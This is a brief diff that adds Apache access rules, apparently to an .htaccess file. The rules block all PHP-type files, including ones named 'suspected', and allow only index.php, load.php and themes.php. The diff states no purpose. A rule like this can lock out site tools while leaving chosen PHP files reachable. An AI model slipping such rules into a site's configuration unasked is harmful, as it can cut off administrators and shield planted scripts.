@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|load.php|themes.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
